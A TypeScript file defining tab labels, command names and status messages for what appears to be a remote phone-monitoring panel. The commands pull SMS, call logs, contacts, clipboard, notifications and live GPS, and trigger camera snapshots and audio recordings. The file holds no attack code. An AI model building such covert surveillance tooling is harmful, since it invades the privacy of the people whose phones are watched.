// lib/device-tab-meta.ts

export interface TabMeta {
  id: string;
  name: string;
  waitMsg: string;
  doneMsg: string;
  cmd?: string;
}

export const DEVICE_TABS_META: Record<string, TabMeta> = {
  gallery: {
    id: "gallery",
    name: "Gallery & Media",
    waitMsg: "Request sent! Waiting for Gallery files from phone...",
    doneMsg: "Gallery updated! Fresh media ready.",
    cmd: "sync_gallery",
  },
  contacts: {
    id: "contacts",
    name: "Contacts",
    waitMsg: "Request sent! Waiting for Contacts from phone...",
    doneMsg: "Contacts updated! Fresh contacts ready.",
    cmd: "sync_contacts",
  },
  calls: {
    id: "calls",
    name: "Call Logs",
    waitMsg: "Request sent! Waiting for Call logs from phone...",
    doneMsg: "Call logs updated! Fresh call history ready.",
    cmd: "sync_calls",
  },
  messages: {
    id: "messages",
    name: "SMS Messages",
    waitMsg: "Request sent! Waiting for SMS messages from phone...",
    doneMsg: "Messages updated! Fresh SMS ready.",
    cmd: "sync_messages",
  },
  apps: {
    id: "apps",
    name: "Installed Apps",
    waitMsg: "Request sent! Waiting for Installed Apps from phone...",
    doneMsg: "Apps updated! Fresh app list ready.",
    cmd: "sync_apps",
  },
  camera: {
    id: "camera",
    name: "Snaps",
    waitMsg: "Request sent! Waiting for snapshot from phone...",
    doneMsg: "Snapshot captured & received!",
    cmd: "take_photo",
  },
  audio: {
    id: "audio",
    name: "Audio Recording",
    waitMsg: "Request sent! Waiting for audio clip from phone...",
    doneMsg: "Audio clip captured & received!",
    cmd: "record_audio",
  },
  security: {
    id: "security",
    name: "Security & WiFi",
    waitMsg: "Request sent! Waiting for WiFi scan from phone...",
    doneMsg: "Security & WiFi scan updated!",
    cmd: "sync_wifi",
  },
  map: {
    id: "map",
    name: "Live GPS Map",
    waitMsg: "Request sent! Triangulating fresh GPS fix from phone...",
    doneMsg: "Live GPS location updated!",
    cmd: "fetch_location",
  },
  notifications: {
    id: "notifications",
    name: "Notifications",
    waitMsg: "Request sent! Fetching Notifications from phone...",
    doneMsg: "Notifications refreshed!",
    cmd: "fetch_notifications",
  },
  clipboard: {
    id: "clipboard",
    name: "Clipboard",
    waitMsg: "Request sent! Fetching Clipboard from phone...",
    doneMsg: "Clipboard refreshed!",
    cmd: "fetch_clipboard",
  },
};

export function getTabMeta(tabId: string): TabMeta {
  return (
    DEVICE_TABS_META[tabId] || {
      id: tabId,
      name: tabId.charAt(0).toUpperCase() + tabId.slice(1),
      waitMsg: `Request sent! Waiting for ${tabId} from phone...`,
      doneMsg: `${tabId.charAt(0).toUpperCase() + tabId.slice(1)} updated!`,
    }
  );
}

export function getCommandWaitMessage(command: string, payload: any = {}, label?: string): string {
  if (command === "upload_file" || command === "fetch_file") {
    return `Requesting ${payload?.file_name || "file"} from phone...`;
  }
  if (command === "take_photo") {
    const cam = payload?.camera || "camera";
    return `Request sent! Waiting for ${cam} snapshot from phone...`;
  }
  if (command === "record_audio") {
    const dur = payload?.duration || 15;
    return `Request sent! Waiting for ${dur}s audio recording from phone...`;
  }
  for (const meta of Object.values(DEVICE_TABS_META)) {
    if (meta.cmd === command) return meta.waitMsg;
  }
  return label ? `Request sent! Waiting for ${label}...` : "Request sent! Waiting for device...";
}
